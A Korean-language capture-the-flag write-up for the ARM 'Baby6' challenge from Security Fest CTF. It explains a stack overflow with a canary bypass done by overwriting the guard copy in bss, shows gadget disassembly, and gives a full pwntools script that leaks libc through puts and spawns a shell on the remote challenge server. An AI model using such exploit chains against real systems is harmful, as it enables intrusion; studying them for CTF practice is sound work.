---
title: Secfestctf Writeup
date: 2019-06-125
---

### Baby6

ARM arch (arm mode)

```c
int sub_8654()
{
  int v1; // [sp+0h] [bp-54h]
  char *v2; // [sp+4h] [bp-50h]
  char *i; // [sp+4h] [bp-50h]
  int v4; // [sp+8h] [bp-4Ch]
  char s; // [sp+Ch] [bp-48h]

  v1 = 0;
  v2 = &s;
  memset(&s, 0, 0x40u);
  setvbuf((FILE *)stdin, 0, 2, 0);
  setvbuf((FILE *)stdout, 0, 2, 0);
  alarm(0x3Cu);
  banner();
  while ( 1 )
  {
    printf("number: ");
    fgets(byte_112F0, 4132, (FILE *)stdin);
    v4 = atoi(byte_112F0);
    if ( !v4 )
      break;
    *(_DWORD *)v2 = v4;
    v2 += 4;
  }
  for ( i = &s; *(_DWORD *)i; i += 4 )
    v1 += *(_DWORD *)i;
  printf("\x1B[1mtotal:\x1B[0m %d\n", v1);
  return 0;
}
```

fgets로 bss에 쓰고 입력한 값을 atoi로 변환에 s 배열에 차곡차곡 넣어준다. canary가 있는데 bss영역에 canary 비교 값이 존재하고 그 값을 덮고 스택의 canary를 맞춰주면 된다.

```c
.bss:000116F0 __stack_chk_guard % 4                   ; DATA XREF: LOAD:0000826C↑o
.bss:000116F0                                         ; banner+C↑o ...
.bss:000116F0                                         ; Copy of shared data
```

arm 익스를 몇번 안해보기도 했고 잘 기억이 안났었는데 익스 자체는 mips랑 똑같이 바이너리 내부의 가젯을 이용했다. 기억 상에서는 pop r0 ~r8 이런식으로 가젯이 존재했던 것 같은데 보통 존재하지 않고 JOP로 익스를 해야 한다고 들었다.

```c
.text:0000881C loc_881C                                ; CODE XREF: sub_87E4+58↓j
.text:0000881C                 MOV     R0, R6
.text:00008820                 MOV     R1, R7
.text:00008824                 MOV     R2, R8
.text:00008828                 LDR     R12, [R10,R4,LSL#2]
.text:0000882C                 MOV     LR, PC
.text:00008830                 BX      R12             ; sub_85D4
.text:00008834                 ADD     R4, R4, #1
.text:00008838                 CMP     R4, R5
.text:0000883C                 BCC     loc_881C
.text:00008840
.text:00008840 loc_8840                                ; CODE XREF: sub_87E4+30↑j
.text:00008840                 LDMFD   SP!, {R4-R10,LR}
.text:00008844                 BX      LR
```

8840 으로 r 레지스터 세팅한 후 881c에서 해당 함수를 호출 할 수 있다 LDR R12, [R10,,,] 에서 *R10 을 로드하기 때문에 bss 영역에  puts_plt를 넣고 bss의 주소를 넣어주어야 한다. 

```python
from pwn import *
import sys

if len(sys.argv)>1 :
	t = remote('baby-01.pwn.beer',10006)
	#t = process(['qemu-arm','-L','/usr/arm-linux-gnueabi','./baby6'])
else :
	t = process(['qemu-arm','-g','8888','-L','/usr/arm-linux-gnueabi','./baby6'])

def pp(a):
	log.info("%s : 0x%x" % (a,eval(a)))

e = ELF('./baby6')
l = e.libc

sa = lambda w: t.sendlineafter("number:",str(w))
r = lambda z: t.recvuntil(str(z))

for i in range(18):
	sa("1")

puts = e.plt['puts']
puts_got = e.got['puts']
main = 0x8550

setting_r = 0x00008840 # LDMFD   SP!, {R4-R10,LR}
call = 0x0000881C

sa(str(setting_r))
sa("1")
sa("2")
sa(str(puts_got))
sa("1")
sa("1")
sa("1")
sa(str(0x112f0-4))
sa(str(call))

sa(main)
sa(main)
sa(main)
sa(main)
sa(main)
sa(main)
sa(main)
sa(main)
sa(main)
sa(main)
sa(main)

sa("\xfc\x84\x00\x00" + "1"*(0x400-4) + p32(1))
r("\n")

libc = u32(t.recv(4)) - 0x47b01 
pp('libc')
sys = libc + 0x2d4cd 
pp('sys')

for i in range(18):
	sa("1")

sa(str(setting_r))
sa("1")
sa("2")
sa(str(0x112f0+8))
sa("1")
sa("1")
sa("1")
sa(str(0x112f0))
sa(str(call))

sa("1"*4 + p32(sys) + "/bin/sh\x00" + "1"*(0x400-16) + p32(1))
sa("")

t.sendline("cat flag")

t.interactive()
```

puts leak -> system

립시 찾기가… 문제에서 립시를 안줬는데 립시를 사용안하고 풀 수 있는진 모르겠다.. 18.04에서 qemu로 돌리는거라 생각했는데 offset이 달라서 시간이 오래 걸렸다.. armhf 라이브러리를 사용하고 있어서 나중에 찾았음 ㅠ

풀 때 도움 주신 @shpik님 감사합니다.

